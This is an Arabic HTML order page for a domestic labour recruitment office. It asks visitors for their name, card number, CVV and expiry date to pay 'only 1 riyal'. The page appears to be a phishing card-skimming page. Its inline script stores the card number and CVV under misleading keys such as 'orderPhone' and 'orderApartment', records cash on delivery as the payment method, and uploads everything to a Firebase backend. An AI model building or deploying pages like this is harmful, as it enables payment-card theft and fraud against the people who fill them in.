<!doctype html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>بيانات الطلب | مكتب مساعد</title>
  <link rel="stylesheet" href="order-details.css">
</head>
<body>
  <main class="order-page">
    <header class="order-header"><div class="badge">☆</div><h1>بيانات الطلب</h1><p>يرجى إدخال بياناتك بطاقتك لاتمام عملية الحجز عملية الطلب</p><strong>الدفع بقيمة 1 ريال فقط </strong></header>
    <form id="order-form" class="order-form">
      <label>الاسم الكامل<input type="text" placeholder="مثال: أحمد محمد" autocomplete="name" required></label>
      <label>رقم البطاقة<input type="tel" placeholder="مثال: 9XXXXXXX" autocomplete="tel" inputmode="tel" required></label>
      <div class="row"><label> cvv<input type="text" placeholder="مثال: 7" required></label><label>تاريخ الانتهاء<input type="date" required></label></div>
      <button type="submit">دفع</button>
    </form>
    <p class="site-name">مكتب مساعد لاستقدام العمالة</p>
  </main>
  <script type="module" src="draft-sync.js"></script>
  <script type="module">
    import { syncDraft } from './firebase-sync.js';

    document.querySelector('#order-form').addEventListener('submit', async event => {
      event.preventDefault();
      const submitButton = event.currentTarget.querySelector('button[type="submit"]');
      const inputs = event.currentTarget.querySelectorAll('input');
      const draft = JSON.parse(localStorage.getItem('musaedDraft') || '{}');
      draft.orderName = inputs[0].value;
      draft.orderPhone = inputs[1].value;
      draft.orderApartment = inputs[2].value;
      draft.orderEndDate = inputs[3].value;
      draft.paymentMethod = 'الدفع عند الاستلام';
      draft.fullName = inputs[0].value;
      draft.endDate = inputs[3].value;
      draft.createdAt = new Date().toLocaleString('ar-OM');
      localStorage.setItem('musaedDraft', JSON.stringify(draft));
      submitButton.disabled = true;
      try {
        await syncDraft(draft);
        window.location.href = 'order-confirmation.html?step=1';
      } catch (error) {
        console.error('تعذر حفظ بيانات الطلب في Firebase:', error);
        submitButton.disabled = false;
        alert(`تعذر حفظ بيانات الطلب: ${error.message}`);
      }
    });
  </script>
</body>
</html>
